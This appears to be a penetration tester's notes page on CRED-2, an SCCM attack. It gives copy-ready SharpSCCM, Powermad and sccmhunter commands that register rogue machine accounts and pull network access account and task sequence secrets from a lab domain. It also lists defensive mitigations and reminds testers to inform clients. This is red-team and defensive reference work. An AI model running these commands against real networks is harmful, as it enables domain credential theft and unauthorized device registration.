# CRED-2 - Policy Request Credentials

## Document Reference

* [CRED-2](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/attack-techniques/CRED/CRED-2/cred-2\_description.md)

## Description

Request computer policy and deobfuscate secrets

## Requirements

* PKI certificates are not required for client authentication

Additionally, any of the below requirements can be met to perform this attack.

* Domain Computer credentials&#x20;
* The ability to create computer objects (MachineAccountQuota)
* Local administrator on a SCCM client

## Windows

### Local Administrator on SCCM Client

If you are a local administrator or running as SYSTEM on a SCCM client. We can simply request the computer policy without specifying any credentials

```
SharpSCCM.exe get secrets
```

### Using Domain Computer Credentials

If we have a password for a domain computer account we can use this directly with SharpSCCM to register a new device

```powershell
SharpSCCM.exe get secrets -r EvilDevice -u mecm$ -p 'I(A*r@KqUuoj5oHFO=<--Snip>-->'
```

### Machine Account Quota

Create new machine account with Powermad

```powershell
New-MachineAccount -MachineAccount  EvilSCCM$ -Domain sccm.lab -DomainController 192.168.60.10
```

Use SharpSCCM to request policy for the new account

```powershell
# get secrets is preferred over naa due to secrets potentially containing further
# credentials from task sequences and collection varaibles

SharpSCCM.exe get secrets -r newdevice -u EvilSCCM$ -p Evil123
SharpSCCM.exe get naa -r newdevice -u EvilSCCM$ -p Evil123
```

<figure><img src="../../../.gitbook/assets/image (2138).png" alt=""><figcaption></figcaption></figure>

## Linux

### SCCMhunter

{% code overflow="wrap" %}
```python
# auto, requires user credentials and MachineAccountQuota greater than 0
python3 sccmhunter.py http -u standard-user -p 'Password1!' -d sccm.lab -dc-ip 192.168.60.10 -auto -sleep 30

# Manual, requires user credentials and computer account credentials
python3 sccmhunter.py http -u standard-user -p 'Password1!' -d sccm.lab -dc-ip 192.168.60.10 -cn 'EvilRiley$' -cp Evil123 -sleep 30
```
{% endcode %}

<figure><img src="../../../.gitbook/assets/image (2148).png" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
This will create a device object within SCCM. Ensure that when on an engagement, the client is informed and request for it to be deleted once completed.
{% endhint %}

<figure><img src="../../../.gitbook/assets/image (2139).png" alt=""><figcaption></figcaption></figure>

*   ### Defensive IDs

    * [PREVENT-3: Harden or disable network access accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-3/prevent-3\_description.md)
    * [PREVENT-4: Configure Enhanced HTTP](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-4/prevent-4\_description.md)
    * [PREVENT-8: Require PKI certificates for client authentation](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-8/prevent-8\_description.md)
    * [PREVENT-10: Enforce the principle of least privilege for accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-10/prevent-10\_description.md)
    * [PREVENT-16: Remove SeMachineAccountPrivilege and set MachineAccountQuota to 0 for non-admin accounts](https://github.com/subat0mik/Misconfiguration-Manager/blob/main/defense-techniques/PREVENT/PREVENT-16/prevent-16\_description.md)

    \
